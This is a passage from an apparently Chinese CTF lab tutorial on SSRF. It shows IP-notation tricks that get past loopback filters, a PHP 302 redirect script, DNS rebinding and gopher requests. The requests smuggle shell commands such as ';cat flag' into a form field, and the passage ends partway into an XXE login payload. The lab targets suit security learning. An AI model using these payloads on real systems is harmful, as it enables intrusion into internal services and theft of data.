class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013853782.png" alt="image-20250423013853782"></p><h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="SSRF之回环地址绕过"><a href="#SSRF之回环地址绕过" class="headerlink" title="SSRF之回环地址绕过"></a>SSRF之回环地址绕过</h3><p>如下页面要求访问本地的<code>flag.php</code>文件，但会发现<code>127.0.0.1</code>被过滤了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/flag.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423131511681.png" alt="image-20250423131511681"></p><h4 id="其他进制绕过"><a href="#其他进制绕过" class="headerlink" title="其他进制绕过"></a>其他进制绕过</h4><p>当<code>127.0.0.1</code>被限制时，可以将其进行变形显示，使用其他进制进行绕过</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>点分十进制<br><span class="hljs-number">01111111000000000000000000000001</span>数据包中实际是<span class="hljs-number">32</span>位bit二进制，没有点<br><span class="hljs-number">0b01111111000000000000000000000001</span>二进制<br><span class="hljs-number">017700000001</span>八进制<br><span class="hljs-number">0x7F000001</span>十六进制<br><span class="hljs-number">2130706433</span>十进制（连续）<br></code></pre></td></tr></table></figure><p>实际应用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 点分十进制</span><br>http:<span class="hljs-comment">//127.0.0.1/flag.php</span><br><span class="hljs-comment"># 二进制</span><br>http:<span class="hljs-comment">//0b01111111000000000000000000000001/flag.php</span><br><span class="hljs-comment"># 八进制</span><br>http:<span class="hljs-comment">//017700000001/flag.php</span><br><span class="hljs-comment"># 点分八进制</span><br>http:<span class="hljs-comment">//0177.0000.0000.0001/flag.php</span><br><span class="hljs-comment"># 十六进制</span><br>http:<span class="hljs-comment">//0xF000001/flag.php</span><br><span class="hljs-comment"># 点分十六进制</span><br>http:<span class="hljs-comment">//0x7F.0x00.0x00.0x01/flag.php</span><br>http:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br><span class="hljs-comment"># 三十二进制</span><br>http:<span class="hljs-comment">//01111111000000000000000000000001/flag.php</span><br><span class="hljs-comment"># 十进制</span><br>http:<span class="hljs-comment">//2130706433/flag.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423132338626.png" alt="image-20250423132338626"></p><h3 id="SSRF之302重定向绕过"><a href="#SSRF之302重定向绕过" class="headerlink" title="SSRF之302重定向绕过"></a>SSRF之302重定向绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者访问SSRF服务器（如<code>http://home.ctf.com:7777</code>），SSRF服务器解析访问公网web服务器（有公网IP的服务器，可以对域名解析的web服务器），然后这台服务器返回重定向302到127.0.0.1给SSRF服务器，这可以绕过我们想要提交的受限制的地址，然后SSRF服务器访问本地127.0.0.1，并且把结果返回给攻击者</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423132638267.png" alt="image-20250423132638267"></p><h4 id="构建302重定向代码"><a href="#构建302重定向代码" class="headerlink" title="构建302重定向代码"></a>构建302重定向代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在有公网IP的VPS上创建一个文件写入上面的代码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135138756.png" alt="image-20250423135138756"></p><p>然后使用命令监听7777端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0.0.0.0:7777<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135214639.png" alt="image-20250423135214639"></p><p>在靶场随便访问一个内网地址</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.1.151:7777/index.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423134019306.png" alt="image-20250423134019306"></p><p>这里无法回显，因为禁用了访问内网IP</p><p>可以通过访问刚才的VPS的代码文件，从而返回重定向302到127.0.0.1给SSRF服务器，然后SSRF服务器访问本地127.0.0.1，并且把结果返回给我们</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//&lt;VPS的IP&gt;/302.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135501357.png" alt="image-20250423135501357"></p><h3 id="SSRF之DNS重绑定绕过"><a href="#SSRF之DNS重绑定绕过" class="headerlink" title="SSRF之DNS重绑定绕过"></a>SSRF之DNS重绑定绕过</h3><p>针对SSRF漏洞的防御</p><ul><li>解析目标URL，获取其Host</li><li>解析Host，获取Host指向的IP地址</li><li>检查IP地址是否为内网地址</li><li>请求URL</li><li>如果有跳转，拿出跳转URL，执行1</li></ul><p>可以有效限制以下内容</p><ul><li>直接访问内网IP</li><li>302跳转</li><li>xip.io&#x2F;xip.name及短链接变换等URL变形</li><li>畸形URL</li><li><code>iframe</code>攻击</li><li>IP进制转换</li></ul><p>但是无法防御DNS重绑定攻击</p><h4 id="SSRF防御模式"><a href="#SSRF防御模式" class="headerlink" title="SSRF防御模式"></a>SSRF防御模式</h4><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/1737183472115-1fe2ee10-c532-44bb-b5d8-ac7569a5c703.webp" alt="image.png"></p><ul><li>在用户浏览器输入URL，客户端获取输入的URL，从该URL里提取Host（IP地址，可能是IP地址，也可能是域名）</li><li>如果提取到的Host是域名，对该Host进行DNS解析，从而获取到解析的IP地址</li><li>判断获取到的IP地址是合法的还是非法的（如是否是私有IP等），如果是非法的，直接返回内容</li><li>如果检测到IP地址是合法的，就会执行服务端请求URL（curl的阶段发包），这里再进行一次DNS解析</li></ul><p>两次DNS解析</p><ul><li>**第一次DNS解析：**是对URL的Host进行DNS解析</li><li>**第二次DNS解析：**使用curl发包时候进行DNS解析</li></ul><p>漏洞是在第二次DNS解析时形成的，可以利用两次DNS解析的时间差进行绕过</p><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>利用服务器两次解析同一域名的短暂间隙，更换域名背后的IP，达到突破同源策略或过WAF进行SSRF的目的</p><p><strong>第一次DNS解析时检测URL的，第二次DNS解析是真正去访问，在第一次使其获取的是一个假的IP地址，在第二次时获取到一个回环地址，这就可以绕过WAF的限制，进行SSRF</strong></p><p>缓存是与DNS中的机制TTL有关：域名和IP绑定关系的Cache存活的最长时间</p><p>TTL最理想的设置是0，即在第一次解析后，立马换位我们想要访问的内网IP，有些公共DNS服务器还是会把记录进行缓存</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423141417741.png" alt="image-20250423141417741"></p><p>可以使TTL值为0的网站：<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p>下面俩的私网和公网IP可以调换</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423142122121.png" alt="image-20250423142122121"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://deb74166.7f000001.rbndr.us/flag.php<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423142207456.png" alt="image-20250423142207456"></p><h2 id="SSRF进行其他漏洞利用"><a href="#SSRF进行其他漏洞利用" class="headerlink" title="SSRF进行其他漏洞利用"></a>SSRF进行其他漏洞利用</h2><h3 id="使用SSRF进行命令执行"><a href="#使用SSRF进行命令执行" class="headerlink" title="使用SSRF进行命令执行"></a>使用SSRF进行命令执行</h3><p>前提是已经通过前面学习的三个伪协议成功查找到内网存活的主机、开放的端口、并且通过目录扫描出一个存在命令执行漏洞的页面，如下获取的<code>shell.php</code>存在命令执行漏洞</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/shell.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423143421393.png" alt="image-20250423143421393"></p><h4 id="使用http伪协议进行GET提交"><a href="#使用http伪协议进行GET提交" class="headerlink" title="使用http伪协议进行GET提交"></a>使用<code>http</code>伪协议进行GET提交</h4><p>这个页面可以通过提交GET参数<code>cmd</code>进行命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.4/shell.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423143712002.png" alt="image-20250423143712002"></p><h4 id="使用gopher伪协议进行GET提交"><a href="#使用gopher伪协议进行GET提交" class="headerlink" title="使用gopher伪协议进行GET提交"></a>使用<code>gopher</code>伪协议进行GET提交</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/shell.php?cmd=ls</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><br></code></pre></td></tr></table></figure><p>首先进行抓包</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.4:80/_</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144503637.png" alt="image-20250423144503637"></p><p>放入重放器进行两次URL编码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144744986.png" alt="image-20250423144744986"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144822738.png" alt="image-20250423144822738"></p><p>发送请求</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144920889.png" alt="image-20250423144920889"></p><h4 id="使用gopher伪协议进行POST提交"><a href="#使用gopher伪协议进行POST提交" class="headerlink" title="使用gopher伪协议进行POST提交"></a>使用<code>gopher</code>伪协议进行POST提交</h4><p>使用<code>http</code>伪协议访问漏洞网站</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.5/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423145354279.png" alt="image-20250423145354279"></p><p>可以使用bp抓包获取参数</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423145650718.png" alt="image-20250423145650718"></p><p>进而构造POC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150006536.png" alt="image-20250423150006536"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150619955.png" alt="image-20250423150619955"></p><p>这里返回的结果要在源码中查看</p><p>然后就可以构造执行命令的POC，要注意修改长度</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;ls</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150923178.png" alt="image-20250423150923178"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>21<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;cat flag</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423151424717.png" alt="image-20250423151424717"></p><h3 id="使用SSRF进行XXE"><a href="#使用SSRF进行XXE" class="headerlink" title="使用SSRF进行XXE"></a>使用SSRF进行XXE</h3><h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.6/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509202417016.png" alt="image-20250509202417016"></p><p>查看源代码，核心代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doLogin</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_ invoke__">val</span>();<br><span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_ invoke__">val</span>();<br><span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;用户名或密码不为空&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br>    $.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,<br>        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<br>        <span class="hljs-attr">data</span>: data,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<br>        <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">success</span>: function (result) &#123;<br>        <span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        <span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;登录失败&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;登录成功&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;系统错误&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>        &#125;<br>        &#125;,<br>    &#125;); <br>&#125;<br></code></pre></td></tr></table></figure><p>从代码中可以发现，在<code>doLogin()</code>这个函数中，我们提交的用户名和密码会被拼接进如下代码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br></code></pre></td></tr></table></figure><p>这是一个典型的XML语言构造方式，然后是进行的POST提交，提交给<code>doLogin.php</code>，还要注意格式类型是xml的</p><h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>先构造一个简单的，提交用户名和密码都是admin</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.6<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>66<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span 